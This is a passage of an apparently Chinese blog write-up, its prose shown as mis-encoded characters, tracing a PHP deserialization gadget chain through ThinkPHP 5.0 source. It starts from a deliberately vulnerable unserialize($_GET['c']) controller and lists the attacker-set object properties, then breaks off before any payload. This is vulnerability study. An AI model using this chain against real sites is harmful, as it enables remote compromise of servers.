class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$c</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">        var_dump(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to ThinkPHP!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>æ¼æ´å…¥å£æ˜¯<code>/thinkphp/library/think/process/pipes/Windows.php</code>ä¸­çš„__destruct()å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;close();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;removeFiles();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>close()å‡½æ•°ä½œç”¨æ˜¯å…³é—­æ–‡ä»¶ï¼Œæ²¡æœ‰åˆ©ç”¨ç‚¹ï¼Œè·Ÿè¿›è°ƒç”¨çš„removeFiles()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            @unlink(<span class="variable">$filename</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;files = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰file_exists()å‡½æ•°ï¼Œå…¶è°ƒç”¨æ—¶éœ€è¦çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„å‚æ•°ï¼Œå¦‚æœä¼ å…¥ä¸€ä¸ªå¯¹è±¡ï¼Œå°±ä¼šå…ˆè°ƒç”¨è¯¥ç±»çš„__toString() å‡½æ•°ï¼Œå°†å…¶è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œç„¶åå†åˆ¤æ–­</p><p>å…¨å±€æœç´¢__toString()ï¼Œè¿›å…¥<code>./Model.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson() </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›__tojson()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span>(<span class="params"><span class="variable">$options</span> = JSON_UNESCAPED_UNICODE</span>)</span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), <span class="variable">$options</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿›å…¥to_Array()ï¼Œå‡½æ•°å†…æœ‰ä¸‰å¤„å¯ä»¥è§¦å‘__call()å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è½¬æ¢å½“å‰æ¨¡å‹å¯¹è±¡ä¸ºæ•°ç»„</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$item</span>    = [];</span><br><span class="line">        <span class="variable">$visible</span> = [];</span><br><span class="line">        <span class="variable">$hidden</span>  = [];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = array_merge(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¿‡æ»¤å±æ€§</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;visible)) &#123;</span><br><span class="line">            <span class="variable">$array</span> = <span class="keyword">$this</span>-&gt;parseAttr(<span class="keyword">$this</span>-&gt;visible, <span class="variable">$visible</span>);</span><br><span class="line">            <span class="variable">$data</span>  = array_intersect_key(<span class="variable">$data</span>, array_flip(<span class="variable">$array</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;hidden)) &#123;</span><br><span class="line">            <span class="variable">$array</span> = <span class="keyword">$this</span>-&gt;parseAttr(<span class="keyword">$this</span>-&gt;hidden, <span class="variable">$hidden</span>, <span class="literal">false</span>);</span><br><span class="line">            <span class="variable">$data</span>  = array_diff_key(<span class="variable">$data</span>, array_flip(<span class="variable">$array</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">                <span class="comment">// å…³è”æ¨¡å‹å¯¹è±¡</span></span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="keyword">$this</span>-&gt;subToArray(<span class="variable">$val</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_array(<span class="variable">$val</span>) &amp;&amp; reset(<span class="variable">$val</span>) <span class="keyword">instanceof</span> Model) &#123;</span><br><span class="line">                <span class="comment">// å…³è”æ¨¡å‹æ•°æ®é›†</span></span><br><span class="line">                <span class="variable">$arr</span> = [];</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$val</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                    <span class="variable">$arr</span>[<span class="variable">$k</span>] = <span class="keyword">$this</span>-&gt;subToArray(<span class="variable">$value</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$arr</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// æ¨¡å‹å±æ€§</span></span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// è¿½åŠ å±æ€§ï¼ˆå¿…é¡»å®šä¹‰è·å–å™¨ï¼‰</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (is_array(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span></span><br><span class="line">                    <span class="variable">$relation</span>   = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;append(<span class="variable">$name</span>)-&gt;toArray(); </span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (strpos(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                    <span class="comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span></span><br><span class="line">                    <span class="variable">$relation</span>   = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;append([<span class="variable">$attr</span>])-&gt;toArray();<span class="comment">//ç¬¬ä¸€å¤„</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$relation</span> = Loader::parseName(<span class="variable">$name</span>, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>, <span class="variable">$relation</span>)) &#123;</span><br><span class="line">                        <span class="variable">$modelRelation</span> = <span class="keyword">$this</span>-&gt;<span class="variable">$relation</span>();</span><br><span class="line">                        <span class="variable">$value</span>         = <span class="keyword">$this</span>-&gt;getRelationData(<span class="variable">$modelRelation</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (method_exists(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getBindAttr&#x27;</span>)) &#123;</span><br><span class="line">                            <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;getBindAttr(); <span class="comment">//ç¬¬äºŒå¤„</span></span><br><span class="line">                            <span class="keyword">if</span> (<span class="variable">$bindAttr</span>) &#123;</span><br><span class="line">                                <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$attr</span>) &#123;</span><br><span class="line">                                    <span class="variable">$key</span> = is_numeric(<span class="variable">$key</span>) ? <span class="variable">$attr</span> : <span class="variable">$key</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;data[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bind attr has exists:&#x27;</span> . <span class="variable">$key</span>);</span><br><span class="line">                                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                        <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;getAttr(<span class="variable">$attr</span>) : <span class="literal">null</span>; <span class="comment">//ç¬¬ä¸‰å¤„</span></span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$name</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$item</span>) ? <span class="variable">$item</span> : [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰å¤„çš„å‚æ•°æ˜¯å¯æ§çš„ï¼Œå¯ä»¥è¢«åˆ©ç”¨ï¼Œä½†æ˜¯è¦æ»¡è¶³ä¸ƒä¸ªæ¡ä»¶</p><blockquote><ol><li>!empty($this-&gt;append) # $this-&gt;appendä¸ä¸ºç©º</li><li>!is_array($name) # $nameä¸èƒ½ä¸ºæ•°ç»„</li><li>!strpos($name, â€˜.â€™) # $nameä¸èƒ½æœ‰.</li><li>method_exists($this, $relation) # $relationå¿…é¡»ä¸ºModelç±»é‡Œçš„æ–¹æ³•</li><li>method_exists($modelRelation, â€˜getBindAttrâ€™) # $modelRelationå¿…é¡»å­˜åœ¨getBindAttræ–¹æ³•</li><li>$bindAttr # å¿…é¡»æœ‰å€¼</li><li>!isset($this-&gt;data[$key]) # $keyä¸èƒ½åœ¨$this-&gt;dataè¿™ä¸ªæ•°ç»„é‡Œæœ‰ç›¸åŒçš„å€¼ã€‚</li></ol></blockquote><p>$this-&gt;appendæ˜¯å¯æ§æ•°ç»„ï¼Œå‰ä¸‰ä¸ªæ¡ä»¶åªè¦ä»¤<code>$this-&gt;append = [string]</code>å°±èƒ½æ»¡è¶³</p><p>ç¬¬å››ä¸ªæ¡ä»¶ä¸parseName()å‡½æ•°æœ‰å…³ï¼Œåœ¨<code>./Loader.php</code>ä¸­æ‰¾åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å­—ç¬¦ä¸²å‘½åé£æ ¼è½¬æ¢</span></span><br><span class="line"><span class="comment">     * type 0 å°† Java é£æ ¼è½¬æ¢ä¸º C çš„é£æ ¼ 1 å°† C é£æ ¼è½¬æ¢ä¸º Java çš„é£æ ¼</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string  $name    å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  integer $type    è½¬æ¢ç±»å‹</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  bool    $ucfirst é¦–å­—æ¯æ˜¯å¦å¤§å†™ï¼ˆé©¼å³°è§„åˆ™ï¼‰</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseName</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$type</span> = <span class="number">0</span>, <span class="variable">$ucfirst</span> = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$type</span>) &#123;</span><br><span class="line">            <span class="variable">$name</span> = preg_replace_callback(<span class="string">&#x27;/_([a-zA-Z])/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$match</span></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> strtoupper(<span class="variable">$match</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;, <span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ucfirst</span> ? ucfirst(<span class="variable">$name</span>) : lcfirst(<span class="variable">$name</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> strtolower(trim(preg_replace(<span class="string">&quot;/[A-Z]/&quot;</span>, <span class="string">&quot;_\\0&quot;</span>, <span class="variable">$name</span>), <span class="string">&quot;_&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªè½¬æ¢ä»£ç é£æ ¼çš„å‡½æ•°ï¼Œæ•…å®é™…ä¸Š<code>$name == $relation</code>ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨ç»“æ„ç®€å•ä¸”è¿”å›å€¼å¯æ§çš„getError()å‡½æ•°ï¼Œä»¤<code>$this-&gt;append = [&#39;getError&#39;]</code>å³å¯æ»¡è¶³å‰å››ä¸ªæ¡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getError</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> this-&gt;error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›getRelationData()å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è·å–å…³è”æ¨¡å‹æ•°æ®</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> Relation        $modelRelation æ¨¡å‹å…³è”å¯¹è±¡</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> BadMethodCallException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelationData</span>(<span class="params">Relation <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;parent &amp;&amp; !<span class="variable">$modelRelation</span>-&gt;isSelfRelation() &amp;&amp; get_class(<span class="variable">$modelRelation</span>-&gt;getModel()) == get_class(<span class="keyword">$this</span>-&gt;parent)) &#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;parent;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// é¦–å…ˆè·å–å…³è”æ•°æ®</span></span><br><span class="line">        <span class="keyword">if</span> (method_exists(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getRelation&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable">$modelRelation</span>-&gt;getRelation();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">BadMethodCallException</span>(<span class="string">&#x27;method not exists:&#x27;</span> . get_class(<span class="variable">$modelRelation</span>) . <span class="string">&#x27;-&gt; getRelation&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿”å›å€¼ä¸º$valueï¼Œå¹¶ä¸”åªè¦æ»¡è¶³ifæ¡ä»¶å°±èƒ½ä½¿å…¶å¯æ§</p><p>å…¨å±€æœç´¢isselfRelation()ï¼Œå‘ç°æ˜¯æŠ½è±¡ç±»Relationä¸­çš„å‡½æ•°ï¼Œåœ¨å…¨å±€å¯»æ‰¾å®ƒçš„å­ç±»ï¼Œé™¤æŠ½è±¡ç±»OneToOneä¹‹å¤–å‡æ²¡æœ‰getBindAttr()å‡½æ•°ï¼Œç»§ç»­å¯»æ‰¾OneToOneçš„å­ç±»ï¼Œæ‰¾åˆ°HasOneç±»ä¸BelongsToç±»ï¼Œè¿™é‡Œé€‰HasOneç±»</p><p>åˆ™æœ‰<code>$this-&gt;error = new HasOne()</code></p><p>ä¸ºæ»¡è¶³ifæ¡ä»¶åˆ¤æ–­ï¼Œæœ‰ä»¥ä¸‹ä¸‰ç‚¹ï¼š</p><p>ï¼ˆä¸€ï¼‰__call()å‡½æ•°æ¥è‡ªOutputç±»ï¼Œ$valueå¿…é¡»ä¸ºOutputç±»çš„å¯¹è±¡ï¼Œæ•…ä»¤<code>$this-&gt;parent = new Output()</code></p><p>ï¼ˆäºŒï¼‰isselfRelation()ç›´æ¥è¿”å›$this-&gt;relationï¼Œæ•…ä»¤<code>$this-&gt;relation = flase</code></p><p>ï¼ˆä¸‰ï¼‰$this-&gt;parentå·²ç»ç¡®å®šä¸ºOutputç±»ï¼Œæ•…$modelRelation-&gt;getModel()ä¹Ÿåº”ä¸ºOutputç±»</p><p>Relationç±»ä¸­æœ‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getModel</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;query-&gt;getModel();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$this-&gt;queryå¯æ§ï¼Œå…¨å±€æœç´¢å¾—åˆ°Queryç±»ä¸­çš„getModel()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getModel</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;model;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•…å¯ä»¤<code>$this-&gt;query = new Query(), $this-&gt;model = new Output()</code></p><p>åˆ™æœ‰<code>$value = $this-&gt;parent = new Output()</code>ï¼Œç¬¬äº”ä¸ªæ¡ä»¶é€šè¿‡</p><p>æ¥ä¸‹æ¥å› ä¸º<code>$bindAttr = $modelRelation-&gt;getBindAttr()</code>ï¼Œå…¶ä¸­getBindAttr():</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBindAttr</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;bindAttr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$this-&gt;bindAttrå¯æ§ï¼Œå¯ä»¤<code>$this-&gt;bindAttr = [&#39;a&#39;, &#39;b&#39;]</code>ï¼Œç¬¬å…­ä¸ªæ¡ä»¶é€šè¿‡</p><p>ç°åœ¨æ¥åˆ°<code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null</code>ï¼ŒOutputç±»ä¸­æ²¡æœ‰getAttr()å‡½æ•°ï¼Œå› æ­¤ä¼šè°ƒç”¨Outputç±»çš„__call()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="variable">$method</span>, <span class="keyword">$this</span>-&gt;styles)) &#123;</span><br><span class="line">        array_unshift(<span class="variable">$args</span>, <span class="variable">$method</span>);</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>, <span class="string">&#x27;block&#x27;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;handle &amp;&amp; method_exists(<span class="keyword">$this</span>-&gt;handle, <span class="variable">$method</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>-&gt;handle, <span class="variable">$method</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;method not exists:&#x27;</span> . <span class="keyword">__CLASS__</span> . <span class="string">&#x27;-&gt;&#x27;</span> . <span class="variable">$method</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶<code>$method == getAttr, $args == &#39;b&#39;</code>ï¼Œæ‰€ä»¥åº”å½“æ»¡è¶³ç¬¬ä¸€ä¸ªifåˆ¤æ–­å»è°ƒç”¨block()</p><p>$this-&gt;styleå¯æ§ï¼Œä»¤<code>$this-&gt;style = [&#39;getAttr&#39;]</code></p><p>è·Ÿè¿›block()å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">block</span>(<span class="params"><span class="variable">$style</span>, <span class="variable">$message</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;writeln(<span class="string">&quot;&lt;<span class="subst">&#123;$style&#125;</span>&gt;<span class="subst">&#123;$message&#125;</span>&lt;/<span class="subst">$style</span>&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›writeln()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 